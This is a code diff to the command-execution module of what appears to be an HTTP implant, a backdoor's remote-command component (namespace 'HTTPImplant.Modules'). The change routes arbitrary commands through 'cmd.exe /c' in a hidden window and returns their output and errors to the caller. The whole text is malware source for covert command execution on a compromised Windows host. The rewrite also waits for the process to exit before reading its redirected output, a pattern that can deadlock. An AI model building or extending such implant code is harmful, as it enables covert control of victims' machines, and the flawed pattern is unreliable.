@@ -25,45 +25,45 @@ namespace HTTPImplant.Modules
 
         [DllImport("kernel32.dll")]
         static extern uint GetLastError();
-        public static string command(string command, string args)
+        public static string command(string command, string arguments)
         {
-            string result = string.Empty;
+            string result = "";
+            string fileName = "cmd.exe";
+            string args = "/c " + command + " " + arguments;
 
-            try
+            using (var process = new Process())
             {
-                Console.WriteLine("Running: " + command + " With Args " + args);
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
-                    FileName = command,
-                    Arguments = args,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
+                process.StartInfo.FileName = fileName;
+                process.StartInfo.Arguments = args;  // Prefix arguments with /c to execute the command
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
 
-                using (Process process = new Process { StartInfo = startInfo })
+                try
                 {
                     process.Start();
+                    process.WaitForExit();
 
-                    result = process.StandardOutput.ReadToEnd();
+                    string output = process.StandardOutput.ReadToEnd();
                     string error = process.StandardError.ReadToEnd();
 
-                    process.WaitForExit();
+                    result = output;
 
                     if (!string.IsNullOrEmpty(error))
                     {
-                        result += "\nError: " + error;
+                        result += error;
                     }
                 }
-            }
-            catch (Exception ex)
-            {
-                result = "An error occurred: " + ex.Message;
+                catch (Exception ex)
+                {
+                    result = "An exception occurred while executing the command: " + ex.Message;
+                }
             }
 
             return result;
         }
+
         public static string GetCurrentDir()
         {
             string path = Environment.CurrentDirectory;
